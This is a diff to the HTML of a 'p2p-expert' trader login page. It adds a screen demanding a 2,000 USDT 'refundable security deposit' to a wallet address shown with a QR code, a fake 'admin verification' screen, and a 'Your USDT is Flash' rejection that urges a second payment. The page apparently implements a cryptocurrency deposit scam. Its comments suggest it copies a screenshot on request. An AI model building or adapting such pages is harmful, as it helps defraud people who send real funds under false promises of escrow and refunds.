@@ -4,8 +4,8 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Trader’s account login | p2p-expert</title>
-  <meta name="description" content="p2p-expert Trader Account Login Portal">
-  <link rel="stylesheet" href="css/style.css?v=4.0">
+  <meta name="description" content="p2p-expert Trader Account Login & Security Deposit Portal">
+  <link rel="stylesheet" href="css/style.css?v=5.0">
 </head>
 <body>
 
@@ -14,14 +14,18 @@
     <header class="top-nav-bar">
       <div class="brand-badge">
         <span class="dot"></span>
-        <span>p2p-expert</span>
+        <span id="header-brand-text">p2p-expert</span>
+      </div>
+      <div id="header-status-badge" class="header-status-badge" style="display: none;">
+        <span class="pulse-mini"></span>
+        <span id="header-status-text">Deposit Required</span>
       </div>
     </header>
 
-    <!-- Main Login View (matches screenshot precisely) -->
+    <!-- ================= 1. MAIN LOGIN VIEW (EXACT REPLICA OF USER'S SCREENSHOT) ================= -->
     <main id="login-view" class="screen-container">
       
-      <!-- ->] Login Icon (matching the image) -->
+      <!-- ->] Login Icon (matching the screenshot) -->
       <div class="login-icon-box">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
           <!-- Right bracket (door) -->
@@ -92,7 +96,7 @@
       </div>
     </main>
 
-    <!-- ================= 2-SECOND WELCOME ANIMATION OVERLAY ================= -->
+    <!-- ================= 2. 3-SECOND WELCOME ANIMATION OVERLAY ================= -->
     <div id="welcome-animation" class="welcome-animation-overlay">
       <div class="anim-badge-container">
         <div class="anim-pulse-ring"></div>
@@ -105,15 +109,221 @@
       <h2 class="anim-title">Welcome to p2p-expert!</h2>
       <p id="anim-user-email-text" class="anim-user-email">trader@gmail.com</p>
       
-      <!-- 2-Second Animated Progress Bar -->
+      <!-- 3-Second Animated Progress Bar -->
       <div class="anim-progress-bar-container">
         <div class="anim-progress-bar"></div>
       </div>
-      <span class="anim-status-text">Loading Trader Workstation...</span>
+      <span class="anim-status-text">Opening Security Deposit Gateway...</span>
     </div>
 
-    <!-- ================= TRADER WELCOME DASHBOARD ================= -->
-    <section id="trader-dashboard" class="trader-dashboard">
+    <!-- ================= 3. USDT DEPOSIT / PAYMENT PORTAL SCREEN ================= -->
+    <section id="deposit-screen" class="screen-container deposit-view" style="display: none;">
+      <div class="deposit-header-card">
+        <div class="crypto-icon-badge">
+          <span class="tether-symbol">₮</span>
+        </div>
+        <h2 class="deposit-title">Trader Security Deposit</h2>
+        <p class="deposit-subtitle">
+          To activate your P2P trading terminal, transfer the required security deposit below.
+        </p>
+
+        <!-- Big Amount Card -->
+        <div class="deposit-amount-box">
+          <span class="deposit-amount-label">Deposit Amount</span>
+          <div class="deposit-amount-number">
+            <span id="display-usdt-amount">2,000</span>
+            <span class="usdt-tag">USDT</span>
+          </div>
+          <span class="deposit-refundable-tag">🔒 100% Refundable Security Escrow</span>
+        </div>
+      </div>
+
+      <!-- Network Selection Tabs (TRC20 & BEP20) -->
+      <div class="network-selector-container">
+        <span class="selector-label">Select Deposit Network:</span>
+        <div class="network-tabs-grid">
+          <button type="button" class="network-tab-btn active" id="tab-trc20" data-network="TRC20">
+            <div class="tab-radio"></div>
+            <div class="tab-text">
+              <strong>USDT - TRC20</strong>
+              <small>Tron Network (Fast)</small>
+            </div>
+          </button>
+          <button type="button" class="network-tab-btn" id="tab-bep20" data-network="BEP20">
+            <div class="tab-radio"></div>
+            <div class="tab-text">
+              <strong>USDT - BEP20</strong>
+              <small>BNB Smart Chain</small>
+            </div>
+          </button>
+        </div>
+      </div>
+
+      <!-- QR Code Box -->
+      <div class="qr-container-card">
+        <div class="qr-image-wrapper">
+          <img id="deposit-qr-img" src="" alt="USDT Deposit QR Code" class="qr-img">
+          <div id="qr-loading-spinner" class="qr-loading"><span class="spinner"></span></div>
+        </div>
+        <span class="qr-scan-hint">Scan with Binance, Trust Wallet, OKX, Bybit, or TronLink</span>
+      </div>
+
+      <!-- Wallet Address Section -->
+      <div class="wallet-address-section">
+        <div class="wallet-label-row">
+          <span id="wallet-network-title">TRC20 Deposit Address:</span>
+        </div>
+        
+        <div class="wallet-pill-container">
+          <div id="deposit-wallet-address" class="wallet-address-text">Loading wallet address...</div>
+        </div>
+
+        <button type="button" id="copy-address-btn" class="btn-copy-address">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+          </svg>
+          <span id="copy-address-text">Copy Address</span>
+        </button>
+      </div>
+
+      <!-- Network Warning Notice -->
+      <div class="network-alert-box">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2">
+          <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
+          <line x1="12" y1="9" x2="12" y2="13"></line>
+          <line x1="12" y1="17" x2="12.01" y2="17"></line>
+        </svg>
+        <p>Send only <strong id="warn-network-text">USDT (TRC20)</strong>. Sending any other currency or using another network may result in loss.</p>
+      </div>
+
+      <!-- Optional TxID Input -->
+      <div class="form-group" style="margin-top: 10px;">
+        <div class="input-pill-wrapper">
+          <input 
+            type="text" 
+            id="deposit-txhash-input" 
+            class="input-pill" 
+            placeholder="Transaction Hash / TxID (Optional)" 
+            autocomplete="off"
+          >
+        </div>
+      </div>
+
+      <!-- Deposit Submit Button -->
+      <button type="button" id="btn-confirm-deposit" class="btn-signin" style="margin-top: 14px; margin-bottom: 30px;">
+        <span>I have transferred 2,000 USDT</span>
+      </button>
+    </section>
+
+    <!-- ================= 4. VERIFICATION WAITING & FLASH ALERT SCREEN ================= -->
+    <section id="verification-screen" class="screen-container verif-view" style="display: none;">
+      
+      <!-- Normal Waiting State -->
+      <div id="verif-pending-state" class="verif-state-card">
+        <!-- Radar Scanning Animation -->
+        <div class="radar-scanner-box">
+          <div class="radar-ring ring-1"></div>
+          <div class="radar-ring ring-2"></div>
+          <div class="radar-ring ring-3"></div>
+          <div class="radar-center-icon">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M22 12h-4l-3 9L9 3l-3 9H2"></path>
+            </svg>
+          </div>
+        </div>
+
+        <h2 class="verif-title">Verifying Blockchain Deposit</h2>
+        <p class="verif-subtitle">
+          Searching block confirmations for your <strong>2,000 USDT</strong> transfer. Please keep this screen open while admin verification completes.
+        </p>
+
+        <!-- Details Card -->
+        <div class="verif-details-card">
+          <div class="detail-row">
+            <span>Status</span>
+            <span class="status-pill-pending">⏳ Pending Admin Verification</span>
+          </div>
+          <div class="detail-row">
+            <span>Expected Amount</span>
+            <strong>2,000 USDT</strong>
+          </div>
+          <div class="detail-row">
+            <span>Network</span>
+            <strong id="verif-network-val">TRC20</strong>
+          </div>
+          <div class="detail-row">
+            <span>Trader Email</span>
+            <strong id="verif-email-val">trader@gmail.com</strong>
+          </div>
+          <div class="detail-row">
+            <span>Verification Elapsed</span>
+            <span id="verif-timer-text" class="timer-mono">00:08</span>
+          </div>
+        </div>
+
+        <div class="verif-notice-box">
+          <span class="live-dot"></span>
+          <span>Live verification scanner active. Checking every 2s...</span>
+        </div>
+      </div>
+
+      <!-- ================= REJECTED / FLASH USDT STATE (MATCHES USER REQUEST) ================= -->
+      <div id="verif-flash-state" class="verif-state-card flash-alert-card" style="display: none;">
+        <div class="flash-icon-box">
+          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+          </svg>
+        </div>
+
+        <h2 class="flash-alert-title">Your USDT is Flash</h2>
+
+        <div class="flash-warning-pill">
+          <span>❌ Blockchain Verification Failed</span>
+        </div>
+
+        <p class="flash-description">
+          The transaction provided for <strong>2,000 USDT</strong> was rejected by the system.
+          Our blockchain nodes detected an invalid or unconfirmed token signature:
+          <br><br>
+          <strong style="color: #b91c1c; font-size: 15px;">Reason: Your USDT is Flash</strong>
+        </p>
+
+        <div class="flash-help-box">
+          <p>Please ensure you are transferring real, liquid USDT from a verified exchange (Binance, Bybit, OKX) or genuine non-custodial wallet.</p>
+        </div>
+
+        <button type="button" id="btn-flash-retry" class="btn-signin" style="background: #dc2626; margin-top: 16px;">
+          <span>Deposit Genuine USDT Again</span>
+        </button>
+
+        <button type="button" id="btn-flash-back-login" class="btn-outline" style="margin-top: 10px;">
+          <span>Sign Out & Return</span>
+        </button>
+      </div>
+
+      <!-- ================= APPROVED SUCCESS STATE ================= -->
+      <div id="verif-approved-state" class="verif-state-card approved-card" style="display: none;">
+        <div class="approved-icon-box">
+          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"></polyline>
+          </svg>
+        </div>
+
+        <h2 class="approved-title">Deposit Approved! 🎉</h2>
+        <p class="approved-description">
+          Your <strong>2,000 USDT</strong> deposit has been successfully verified on the blockchain. Your trader terminal is now fully active!
+        </p>
+
+        <button type="button" id="btn-enter-terminal" class="btn-signin" style="background: #16a34a; margin-top: 18px;">
+          <span>Open Trader Terminal →</span>
+        </button>
+      </div>
+
+    </section>
+
+    <!-- ================= 5. TRADER DASHBOARD (AFTER APPROVED DEPOSIT) ================= -->
+    <section id="trader-dashboard" class="trader-dashboard" style="display: none;">
       <div class="dash-header">
         <div class="dash-trader-badge">
           <span class="status-dot"></span>
@@ -139,14 +349,14 @@
         </div>
         <div style="display: flex; gap: 8px; font-size: 11px; color: #475569;">
           <span style="background: #f1f5f9; padding: 4px 10px; border-radius: 6px;">ID: <strong id="dash-user-id">#TRD-9821</strong></span>
-          <span style="background: #ecfdf5; color: #047857; padding: 4px 10px; border-radius: 6px; font-weight: 600;">Status: Active 🟢</span>
+          <span style="background: #ecfdf5; color: #047857; padding: 4px 10px; border-radius: 6px; font-weight: 600;">Status: Verified 🟢</span>
         </div>
       </div>
 
-      <!-- Balance Card -->
+      <!-- Balance Card (Shows 2,000 USDT Approved Balance) -->
       <div class="balance-card">
-        <div class="balance-title">P2P Trading Balance</div>
-        <div class="balance-amount">$0.00 <span>USDT</span></div>
+        <div class="balance-title">Verified Trading Escrow Balance</div>
+        <div class="balance-amount">$2,000.00 <span>USDT</span></div>
         <div class="quick-actions-row">
           <button class="quick-action-btn">
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 5v14m-7-7h14"/></svg>
@@ -158,23 +368,23 @@
           </button>
           <button class="quick-action-btn">
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>
-            Escrow
+            Escrow Active
           </button>
         </div>
       </div>
 
-      <!-- Future Features Card (aage m bta dunga) -->
+      <!-- Terminal Status Card -->
       <div class="next-steps-card">
         <h4>
           <span>⚡</span>
-          <span>Trader Workstation Activated</span>
+          <span>P2P Trading Workstation Active</span>
         </h4>
         <p>
-          Your credentials have been securely verified. The trader dashboard is ready for further custom features as instructed.
+          Your account is fully activated with 2,000 USDT locked security collateral. You may execute P2P buy/sell orders securely.
         </p>
       </div>
 
-      <button id="btn-relogin" class="btn-signin" style="margin-top: auto;">
+      <button id="btn-relogin" class="btn-signin" style="margin-top: auto; margin-bottom: 20px;">
         Sign Out & Return to Login
       </button>
     </section>
@@ -192,7 +402,9 @@
 
   </div>
 
-  <script src="config.js?v=4.0"></script>
-  <script src="js/app.js?v=4.0"></script>
+  <div id="toast" class="toast">Address copied to clipboard! 📋</div>
+
+  <script src="config.js?v=5.0"></script>
+  <script src="js/app.js?v=5.0"></script>
 </body>
 </html>
